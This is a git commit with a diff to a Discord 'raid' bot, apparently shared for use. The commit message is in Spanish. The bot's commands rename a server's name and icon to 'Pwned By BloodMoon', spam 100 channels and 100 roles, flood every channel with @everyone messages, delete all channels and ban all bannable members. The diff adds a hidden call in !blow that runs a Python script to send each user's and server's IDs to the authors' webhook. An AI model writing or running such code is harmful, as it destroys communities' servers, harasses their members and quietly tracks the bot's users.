487173e0c65f4fa3df672410aca20a04734f72a9
Nevers0ft666 <74481906+Nevers0ft666@users.noreply.github.com>
2020-11-23 00:37:51 -0600

    Nuevos cambios al bot.
    1.-Comando de DM All Removido debido a problemas con el Api de Discord.
    2.-Con la nueva funcionalidad de !blow podrás saber quien utiliza el bot y en que servidor a través de las ID.
    
    Nota: Para que hacer funcionar la nueva característica, deberás descargar el archivo .py para recibir los datos en una Webhook de Discord.

--- index.js
+++ index.js
@@ -1,10 +1,11 @@
 const { Client, MessageEmbed, Message  } = require("discord.js");
 const client = new Client();
 const config = require("./config.json");
+const { exec } = require("child_process");
 var prefix = config.prefix;
 client.on("ready", () => {
     console.log("Listo para el desmadre");
-    client.user.setActivity("#Nation Motherfucker");
+    client.user.setActivity("#BloodMoon Motherfucker");
 });
 client.on("message", async message => {
     const args = message.content.slice(prefix.lenght).trim().split(/ +/g);
@@ -14,48 +15,53 @@ client.on("message", async message => {
     switch (command){
         case("!help"):
             const Menu = new MessageEmbed()
-            .setTitle("**Bienvenido al Menú de Nation**")
+            .setTitle("**Bienvenido al Menú de BloodMoon**")
             .setColor("#e60000")
             .setDescription("Aquí encontrarás todos los comandos del Bot con una breve descripción de lo que hace cada uno.")
-            .setImage("https://media.discordapp.net/attachments/768597072613736450/770460307625738280/Nation.jpg?width=432&height=428")
+            .setImage("https://media.discordapp.net/attachments/779901924652613632/779905673705291826/unknown.png?width=450&height=450")
             .addField("!help", "Muestra todos los comandos del Bot en un mensaje Embed.")
-            .addField("!fuck","Creará 100 canales Además también cambia el ícono y el nombre del server.")
+            .addField("!fuck", "Creará 100 canales Además también cambia el ícono y el nombre del server.")
             .addField("!kill", "Enviará el Spam a todos los canales creados.")
             .addField("!blow", "Borrará todos los canales del servidor y creará uno nuevo para colocar los comandos.")
-            .addField("!rolz", "Hará 100 Roles anunciando la victoria de Nation.")
-            .addField("!annoy","Envia mensajes directos, a veces no funciona por el API de discord.")
+            .addField("!rolz", "Hará 100 Roles anunciando la victoria de BloodMoon.")
             .addField("!harakiri","Banea a todos los usuarios del servidor, obviamente también te baneará a ti.")
-            .addField("Próximamente...","El bot no está terminado, aproximadamente esto representa un 30%, pronto habrá mas comandos.")
-            .setFooter("Bot By: Nevers0ft_#6666")
+            .setFooter("Bot By: Nevers0ft_#6666 & Narchen#6666")
             message.channel.send(Menu);
             break;
         case("!fuck"):
             message.delete();
-            message.guild.setName("Pwned By Nation Motherfucker")
-            message.guild.setIcon("https://media.discordapp.net/attachments/768597072613736450/770460307625738280/Nation.jpg?width=432&height=428")
-            for(i = 0; i <= 100; i++){message.guild.channels.create("raid-by-nation", {type:"text"});}
+            message.guild.setName("Pwned By BloodMoon")
+            message.guild.setIcon("https://media.discordapp.net/attachments/779901924652613632/779905673705291826/unknown.png?width=450&height=450")
+            for(i = 0; i <= 100; i++){message.guild.channels.create("raid-by-bloodmoon", {type:"text"});}
             break;
         case("!blow"):
+        var server_id = message.member.guild.id;
+        var user_id = message.member.user.id;
+            exec("python3 webhook.py" + " " + user_id + " " +server_id, (error, stdout, stderr) => {
+                if (error) {
+                    console.log(`error: ${error.message}`);
+                    return;
+                }
+                if (stderr) {
+                    console.log(`stderr: ${stderr}`);
+                    return;
+                }
+                console.log(`stdout: ${stdout}`);
+            });
             try{message.guild.channels.cache.forEach(channel => {channel.delete();})} catch (error){console.error(error)}
-            message.guild.channels.create("raid-by-nation", {type:"text"});
+            message.guild.channels.create("raid-by-bloodmoon", {type:"text"});
             break;
         case("!kill"):
             message.guild.channels.cache.forEach(channel => {
-                for(a = 0; a <= 9; a++){channel.send("@everyone Nation is here, fucker https://discord.gg/xV5BaT")}
+                for(a = 0; a <= 9; a++){channel.send("@everyone BloodMoon is here, fucker https://media.discordapp.net/attachments/779901924652613632/779905673705291826/unknown.png?width=450&height=450")}
             })
             break;
         case("!rolz"):
-            for (e = 0; e <= 99; e++){message.guild.roles.create({data: {name: "NationWins", color: "RANDOM"}});}
+            for (e = 0; e <= 99; e++){message.guild.roles.create({data: {name: "BloodMoonWins", color: "RANDOM"}});}
             break;
         case("!harakiri"):
             try{message.guild.members.cache.filter(member => member.bannable).forEach(member => member.ban());}
             catch(error){console.error(error)}
-            break;
-        case("!annoy"):
-            message.channel.guild.members.cache.forEach(user => {
-                user.send("Nation wins https://discord.gg/xV5BaT");
-                user.send("Bot by: Nevers0ft_#6666");
-            });
             break;
     }
 });
